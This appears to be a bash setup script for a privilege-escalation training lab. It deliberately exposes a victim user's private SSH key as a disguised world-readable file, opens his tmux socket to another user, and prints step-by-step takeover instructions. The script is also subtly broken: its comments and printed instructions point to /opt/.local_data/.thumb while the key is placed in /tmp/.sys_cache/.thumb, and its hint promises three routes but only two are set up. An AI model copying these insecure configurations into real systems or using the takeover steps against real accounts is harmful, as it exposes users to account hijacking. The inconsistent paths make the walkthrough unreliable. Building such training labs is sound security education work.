#!/usr/bin/env bash
set -euo pipefail

# -------------------- HORIZONTAL ESCALATION LAB (updated) --------------------
# Integrates with vertical_setup.sh already run on the machine.
# Creates two horizontal vectors:
#  1) PuTTY .ppk disguised in /opt/.local_data/.thumb (readable by alice)
#  2) Shared tmux session for bobby with permissive socket so alice can attach
#
# Usage: sudo ./horizontal_setup.sh
#
LAB_ATK="alice"
LAB_ATK_PASS="alice123"
LAB_VICTIM="bobby"
LAB_VICTIM_PASS="qwerty2020"
# Where we'll place the disguised key (plausible app cache / opt location)
PPK_PLACEMENT_DIR="/tmp/.sys_cache"
PPK_PLACEMENT_PATH="${PPK_PLACEMENT_DIR}/.thumb"
HINT_ATK="/home/${LAB_ATK}/.hint_attacker"
VICTIM_FLAG="/home/${LAB_VICTIM}/bobby_flag.txt"
AUDIT_PUTTY_KEY="puttygen_exec"
AUDIT_HOME_KEY="home_write"
FIND_PPK_HELPER="/usr/local/bin/find_ppk"

export DEBIAN_FRONTEND=noninteractive

echo "[*] Starting enhanced horizontal escalation lab setup..."

# Install packages (tmux + puttygen + audit + aide if missing)
apt-get update -y
apt-get install -y openssh-server putty-tools auditd aide vim less curl tmux

# Ensure sshd + auditd running
systemctl enable --now ssh >/dev/null 2>&1 || true
systemctl enable --now auditd >/dev/null 2>&1 || true

# Create victim and attacker users if missing (idempotent)
if ! id "${LAB_VICTIM}" &>/dev/null; then
  useradd -m -s /bin/bash "${LAB_VICTIM}"
  echo "${LAB_VICTIM}:${LAB_VICTIM_PASS}" | chpasswd
fi

if ! id "${LAB_ATK}" &>/dev/null; then
  useradd -m -s /bin/bash "${LAB_ATK}"
  echo "${LAB_ATK}:${LAB_ATK_PASS}" | chpasswd
fi

# Ensure victim .ssh exists and has a keypair (vertical may have done this already)
VICTIM_KEY_TYPE="ed25519"
VICTIM_PRIV_KEY="/home/${LAB_VICTIM}/.ssh/id_${VICTIM_KEY_TYPE}"
sudo -u "${LAB_VICTIM}" mkdir -p /home/"${LAB_VICTIM}"/.ssh
sudo -u "${LAB_VICTIM}" chmod 700 /home/"${LAB_VICTIM}"/.ssh

if [ ! -f "${VICTIM_PRIV_KEY}" ]; then
  sudo -u "${LAB_VICTIM}" ssh-keygen -t "${VICTIM_KEY_TYPE}" -f "${VICTIM_PRIV_KEY}" -N "" -C "bobby_lab_key" >/dev/null 2>&1 || true
fi

# Append pubkey to authorized_keys (idempotent)
grep -qxF "$(cat ${VICTIM_PRIV_KEY}.pub 2>/dev/null || true)" /home/"${LAB_VICTIM}"/.ssh/authorized_keys 2>/dev/null || \
  cat "${VICTIM_PRIV_KEY}.pub" >> /home/"${LAB_VICTIM}"/.ssh/authorized_keys 2>/dev/null || true
chown -R "${LAB_VICTIM}:${LAB_VICTIM}" /home/"${LAB_VICTIM}"/.ssh
chmod 700 /home/"${LAB_VICTIM}"/.ssh
chmod 600 /home/"${LAB_VICTIM}"/.ssh/authorized_keys || true

# Ensure the bobby flag exists (target for attacker)
echo "HORIZONTAL SUCCESS: you accessed bobby account" > "${VICTIM_FLAG}"
chown "${LAB_VICTIM}:${LAB_VICTIM}" "${VICTIM_FLAG}"
chmod 0400 "${VICTIM_FLAG}"

# --- Create PPK converted from victim private key and hide in /opt/.local_data/.thumb ---
mkdir -p "${PPK_PLACEMENT_DIR}"
chmod 755 "${PPK_PLACEMENT_DIR}" || true
# Convert victim private -> PuTTY .ppk and place in PPK_PLACEMENT_PATH
if command -v puttygen >/dev/null 2>&1; then
  TMP_COPY="/tmp/bobby_priv_tmp"
  cp "${VICTIM_PRIV_KEY}" "${TMP_COPY}" || true
  chmod 600 "${TMP_COPY}" || true
  puttygen "${TMP_COPY}" -O private -o "${PPK_PLACEMENT_DIR}/bobby_private.ppk" >/dev/null 2>&1 || true
  rm -f "${TMP_COPY}" || true
  mv "${PPK_PLACEMENT_DIR}/bobby_private.ppk" "${PPK_PLACEMENT_PATH}" || true
  chown "${LAB_ATK}:${LAB_ATK}" "${PPK_PLACEMENT_PATH}" || true
  chmod 0644 "${PPK_PLACEMENT_PATH}" || true  # readable by all
else
  echo "WARNING: puttygen not installed; place a .ppk at ${PPK_PLACEMENT_PATH}"
fi

# Slight timestamp change to simulate being dropped earlier
if [ -f "${PPK_PLACEMENT_PATH}" ]; then
  touch --date="30 minutes ago" "${PPK_PLACEMENT_PATH}" || true
fi

# Add hint for alice in her home
cat > "${HINT_ATK}" <<'HINT'
There are 3 ways to get into bobby's account:
HINT
chown "${LAB_ATK}:${LAB_ATK}" "${HINT_ATK}" || true
chmod 0640 "${HINT_ATK}" || true

# --- Ensure SSH allows publickey authentication (so converted key works) ---
mkdir -p /etc/ssh/sshd_config.d
echo "PubkeyAuthentication yes" > /etc/ssh/sshd_config.d/99-lab-pubkey.conf
# restart ssh to pick changes
systemctl restart ssh || true

# --- Shared tmux session (robust, group-based permissions) ---
TMUX_SOCKET="/tmp/bobby_tmux.sock"
TMUX_SESSION="shared"
TMUX_GROUP="bobby_tmux"

# ensure group exists and both users are members
groupadd -f "${TMUX_GROUP}" || true
usermod -a -G "${TMUX_GROUP}" "${LAB_VICTIM}" || true
usermod -a -G "${TMUX_GROUP}" "${LAB_ATK}" || true

# Remove stale socket (if any) - safe in lab
[ -S "${TMUX_SOCKET}" ] && rm -f "${TMUX_SOCKET}" || true

# create tmux session as bobby (detached)
sudo -u "${LAB_VICTIM}" tmux -S "${TMUX_SOCKET}" new -d -s "${TMUX_SESSION}" bash -lc "echo '[lab tmux: owned by ${LAB_VICTIM}]'; exec bash" || true

# ensure socket exists and set ownership + perms
if [ -S "${TMUX_SOCKET}" ]; then
  chown "${LAB_VICTIM}:${TMUX_GROUP}" "${TMUX_SOCKET}" || true
  chmod 0770 "${TMUX_SOCKET}" || true
  # give alice read/write via ACL (immediate effect)
  setfacl -m u:${LAB_ATK}:rw "${TMUX_SOCKET}" || true
  echo "Recreated tmux socket ${TMUX_SOCKET} -> owner ${LAB_VICTIM}:${TMUX_GROUP}, mode 770, ACL alice:rw"
else
  echo "ERROR: socket ${TMUX_SOCKET} still missing after creating tmux server."
fi

# --- Print clear instructions for attacker/admin to exercise both vectors ---
cat <<'EOF'

HORIZONTAL LAB READY.

Two ways to get into bobby's account:

A) Via the disguised PuTTY .ppk (PPK -> OpenSSH -> ssh)
-------------------------------------------------------
1) As alice (or su - alice), check the hint:
   $ cat /home/alice/.hint_attacker

2) Look under /opt for hidden/thumb files:
   $ ls -la /opt/.local_data
   $ file /opt/.local_data/.thumb

3) Convert the PPK to an OpenSSH private key (puttygen required):
   # convert PPK -> OpenSSH
   $ puttygen /opt/.local_data/.thumb -O private-openssh -o /tmp/converted_id
   $ chmod 600 /tmp/converted_id

4) Use the converted key to SSH to bobby (local VM):
   $ ssh -i /tmp/converted_id bobby@localhost

   If the key was converted and matches, you will become bobby and can:
   $ cat /home/bobby/bobby_flag.txt

B) Via shared tmux session (attach to bobby's tmux)
---------------------------------------------------
1) The tmux socket is intentionally created at: /tmp/bobby_tmux.sock
   As alice, attach to it:
   $ tmux -S /tmp/bobby_tmux.sock attach -t shared

   (If tmux says 'no session', use 'tmux -S /tmp/bobby_tmux.sock ls' to show sessions.)

2) Once attached you will see session output and can type into the session as if you were bobby.
   This demonstrates how permissive socket permissions allow horizontal takeover.

3) Admin detection checks:
   - Inspect /tmp for tmux sockets and check ownership/permissions:
     # ls -la /tmp/bobby_tmux.sock
     # find /tmp -type s -exec ls -l {} \; 2>/dev/null
   - Alert if socket is world-writable (mode 666/777).
   - Audit for suspicious process attachments or unexpected tmux usage.

EOF

echo "[*] Enhanced horizontal lab setup complete."
